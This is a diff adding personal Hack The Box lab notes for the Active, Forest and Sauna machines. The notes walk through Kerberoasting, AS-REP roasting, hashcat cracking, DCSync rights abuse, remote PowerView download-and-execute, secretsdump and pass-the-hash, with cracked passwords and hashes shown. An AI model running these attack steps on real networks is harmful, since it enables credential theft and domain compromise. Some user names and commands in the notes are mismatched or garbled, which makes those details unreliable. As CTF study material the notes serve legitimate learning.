@@ -679,7 +679,6 @@ We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-
 reflect only active user accounts in the domain.
 
 
-
 Get users for the domain `SVC_TGS`:
 
 ```
@@ -773,3 +772,237 @@ Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 C:\>whoami
 active\administrator
 ```
+
+##### Notes from HTB Labs:
+
+##### Active
+
+root@kali# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+
+root@kali# cat GetUserSPNs.out $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174
+
+$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force hashcat (v4.0.1) starting... ...snip... $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9 184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a 994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0b ea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa 7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d 937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7 532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952 d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b 94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968
+```
+
+So the above were two commands, the first used the Impacket script `GetUserSPNs.py` to find users, in this case we found Administrator. We cat the `GetUserSPNs.out` file, finding a long hash. Then I decrypted it with `hashcat`, getting the password `Ticketmaster1968`.
+```
+
+##### Forest
+
+After running a basic `nmap` search, I see that `ldap` is running on port 389.
+
+I run an `ldap` search to see what I find:
+
+```
+ldapsearch -h {target ip} 389 -x -s base -b ‘’ “(objectClass=*)” “*” +
+```
+
+I get the domain `htb.local`.
+
+After probing several different paths via `smb`, and not getting in, I try `rpc` on port 445.
+
+```
+rpcclient -U "" -N {target ip}
+rpcclient $> enumdomusers
+
+user:[Administrator] rid:[0x1f4]       
+user:[Guest] rid:[0x1f5]               
+user:[krbtgt] rid:[0x1f6]              
+user:[DefaultAccount] rid:[0x1f7]      
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]  
+user:[andy] rid:[0x47e]                
+user:[mark] rid:[0x47f]                
+user:[santi] rid:[0x480]
+```
+
+I create a users list with the following users:
+
+```
+root@kali# cat users 
+Administrator 
+andy 
+lucinda 
+mark 
+santi 
+sebastien 
+svc-alfresco
+
+root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
+
+...
+
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
+```
+
+I get the hash above for the user `svc-alfresco`.
+
+I use hashcat to break the hash.
+
+```
+root@kali# hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force ...[snip]... $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$ 5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004 d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice ...[snip]...
+```
+
+
+I use evil-winrm to connect and shell access to the attacking ip. 
+
+```
+$ evil-winrm -i 10.129.135.40 -u svc-alfresco -p s3rvice
+```
+
+###### Privesc Forest
+
+To visualize our domain and users I want use the application `bloodhound`, 
+
+
+
+Install bloodhound, then run bloodhound-python to enumerate the privilege escalation paths which downloads json files which will be mapped via bloodhound. Then run bloodhound.
+
+```
+$ sudo apt install bloodhound
+$ bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local  -c all -ns {victim ip}
+$ bloodhound
+```
+
+In the Bloodhound UI the credentials for `neo4j` is `neo4j:neo4j`, then click on `Upload Data`, adding those json files from earlier. In `Start Node` add `svc-alfresco` and in `Target Node` add `Domain Admins@HTB.LOCAL`, that gives us a map of the Active Directory.
+
+Now I go back to the Windows shell and add a new user to `Exchange Windows Permissions`
+
+```
+PS C:\Users\svc-alfresco\Documents> net user john abc123! /add /domain
+PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add
+PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" john /add
+
+PS C:\Users\svc-alfresco\Documents> menu
+
+PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
+
+PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://{target ip}/PowerView.ps1')
+
+PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'abc123!' -asplain -force
+
+PS C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
+
+PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
+```
+
+I can now run `secretsdump` as `john`, which gets the `admin`'s hash, then `psexec` with the new hash gets root access to the server. Then I print the root flag.
+
+```
+$ secretsdump.py htb/john@{victim ip}
+
+....
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+
+$ psexec.py administrator@{victim ip} -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+$ type \users\administrator\desktop\root.txt
+97949b4e094f030d9ac3b8608e02cfe1
+```
+
+##### Sauna
+
+I then run `GetNPUsers.py` to get a hash for those users and I get the hash of `fsmith`.
+
+```
+for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.80.69 htb/${user} | grep -v Impacket; done
+
+...
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d
+```
+
+I echo the hash into a file and use `hashcat` to break the hash.
+
+```
+echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d' > hash.txt
+
+$ hashcat -m 18200 svc-alfresco^Cerb /usr/share/wordlists/rockyou.txt
+
+...
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d:Thestrokes23
+```
+
+Above I got the credentials `svc-alfresco:Thestrokes23`, to login I use `evil-winrm`:
+
+```
+$ evil-winrm -i 10.129.80.69 -u fsmith -p Thestrokes23
+```
+
+From here I can cat the user flag:
+
+```
+C:\Users\FSmith\Desktop> cat user.txt
+9448503be312b368c979a07686643305
+```
+
+It is time for privilege escalation, normally I would use WinPEAS.exe, but had issues with it.
+
+I was able however, to run `reg.exe`, which interacts with Windows Registry Editor.
+
+```
+*Evil-WinRM* PS C:\Users\FSmith\Documents> reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
+...
+
+DefaultDomainName    REG_SZ    EGOTISTICALBANK
+DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+...
+DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+```
+
+I now have the credentials `svc_loanmanager:Moneymakestheworldgoround`
+
+I can connect to this user using `evil-winrm`
+
+```
+$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+```
+
+I can do a `secretsdump` to get the Administrator credentials, where I get the Admin's credentials.
+
+```
+$ secretsdump.py egotistical-bank/svc_loanmgr@10.129.80.69 -just-dc-user Administrator
+...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+```
+
+I use this hash to login as Administrator:
+
+```
+$ psexec.py egotistical-bank.local/administrator@10.129.80.69 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+
+C:\Windows\system32> powershell
+
+PS C:\Windows\system32> cd ..
+
+PS C:\Windows> cd Administrator/Desktop
+
+PS C:\Windows\Administrator\Desktop> cat root.txt
+f3fde5394d127479b8d68650a94ce4e6
+```
+
